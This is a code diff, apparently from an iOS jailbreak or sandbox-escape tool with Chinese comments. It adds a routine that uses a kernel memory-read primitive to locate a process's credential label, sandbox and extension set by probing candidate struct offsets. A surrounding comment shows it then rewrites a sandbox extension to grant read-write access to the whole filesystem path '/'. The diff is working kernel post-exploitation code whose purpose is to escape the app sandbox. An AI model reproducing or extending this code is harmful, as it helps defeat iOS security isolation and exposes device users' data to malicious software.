@@ -617,6 +617,69 @@ static uint64_t ds_discover_identities_v3(void)
     return 0;
 }
 
+#pragma mark - 沙盒链路解析（起点是已被 cr_uid 确认的 cred）
+
+/// 从确认过的 ucred 出发，解析 ucred → label → sandbox → ext_set。
+///
+/// 为什么可以试多组 offset：起点是**已被 cr_uid 校验过的真 cred**（不是来路不明的字），
+/// 而且 label 有很强的结构签名——`l_perpolicy[0]`(AMFI) 与 `l_perpolicy[1]`(sandbox) 必须同时是内核指针；
+/// ext_set 还要能读出真正的 ext 链。三道都对上才认。
+static uint64_t ds_resolve_sandbox_extset(uint64_t cred, uint64_t *outSandbox)
+{
+    static const uint64_t labelOffs[]   = { 0x78, 0x70, 0x80, 0x68, 0x88, 0x90, 0x60 };
+    static const uint64_t sandboxOffs[] = { 0x10, 0x08, 0x18, 0x20, 0x28, 0x30 };
+    static const uint64_t extSetOffs[]  = { 0x10, 0x08, 0x18, 0x20, 0x28, 0x30 };
+
+    for (int a = 0; a < 7; a++) {
+        uint64_t label = ds_kread_safe(cred + labelOffs[a]);
+        if (!ds_is_kaddr(label) || (label & 0xF) != 0) continue;
+
+        // label 结构签名：AMFI 槽与 sandbox 槽必须都是内核指针
+        uint64_t amfi = ds_kread_safe(label + 0x08);
+        if (!ds_is_kaddr(amfi)) {
+            ds_log("[逃逸] cred+0x%llx = 0x%llx，但 +0x8(AMFI) = 0x%llx 不是内核指针，跳过",
+                   (unsigned long long)labelOffs[a], (unsigned long long)label, (unsigned long long)amfi);
+            continue;
+        }
+
+        for (int b = 0; b < 6; b++) {
+            uint64_t sandbox = ds_kread_safe(label + sandboxOffs[b]);
+            if (!ds_is_kaddr(sandbox) || (sandbox & 0xF) != 0) continue;
+
+            for (int c = 0; c < 6; c++) {
+                uint64_t extSet = ds_kread_safe(sandbox + extSetOffs[c]);
+                if (!ds_is_kaddr(extSet)) continue;
+
+                // ext 链校验：ext_set 里至少一个槽能读出 ext 头，且 头+0x8 是内核指针
+                bool extLooksRight = false;
+                for (int slot = 0; slot < 8 && !extLooksRight; slot++) {
+                    uint64_t hdr = ds_normalize_ptr(ds_kread_safe(extSet + slot * 8));
+                    if (!ds_is_kaddr(hdr)) continue;
+                    uint64_t ext = ds_normalize_ptr(ds_kread_safe(hdr + 0x8));
+                    if (ds_is_kaddr(ext)) extLooksRight = true;
+                }
+                if (!extLooksRight) continue;
+
+                gCredOff.labelOff = labelOffs[a];
+                gCredOff.sandboxOff = sandboxOffs[b];
+                gCredOff.extSetOff = extSetOffs[c];
+                if (outSandbox) *outSandbox = sandbox;
+
+                ds_log("[逃逸] 沙盒链路确认：cred+0x%llx=label 0x%llx，label+0x%llx=sandbox 0x%llx，"
+                        "sandbox+0x%llx=ext_set 0x%llx",
+                       (unsigned long long)labelOffs[a], (unsigned long long)label,
+                       (unsigned long long)sandboxOffs[b], (unsigned long long)sandbox,
+                       (unsigned long long)extSetOffs[c], (unsigned long long)extSet);
+                return extSet;
+            }
+        }
+        ds_log("[逃逸] label 0x%llx（cred+0x%llx）找到了，但 label→sandbox→ext_set 没对上",
+               (unsigned long long)label, (unsigned long long)labelOffs[a]);
+    }
+
+    return 0;
+}
+
 #pragma mark - 改写沙盒扩展
 
 /// 把扩展数据里的路径改成 "/"，并把长度/哈希字段填成「永远有效」
@@ -672,10 +735,14 @@ static int DSEscapeSandboxInternal(void)
     uint64_t ucred = ds_discover_identities_v3();
     if (!ucred) return -2;
 
-    uint64_t label = ds_kread_safe(ucred + gCredOff.labelOff);
-    uint64_t sandbox = ds_kread_safe(label + gCredOff.sandboxOff);
-    uint64_t extSet = ds_kread_safe(sandbox + gCredOff.extSetOff);
-    if (!ds_is_kaddr(extSet)) return -2;
+    uint64_t sandbox = 0;
+    uint64_t extSet = ds_resolve_sandbox_extset(ucred, &sandbox);
+    if (!extSet) {
+        ds_log("[逃逸] 沙盒链路没能确认；转储这个已确认的 cred（只读，不做任何写操作）：");
+        ds_dump_words("cred", ucred, 0x20);
+        return -2;
+    }
+    (void)sandbox;
 
     const char *rwClass = "com.apple.app-sandbox.read-write";
 
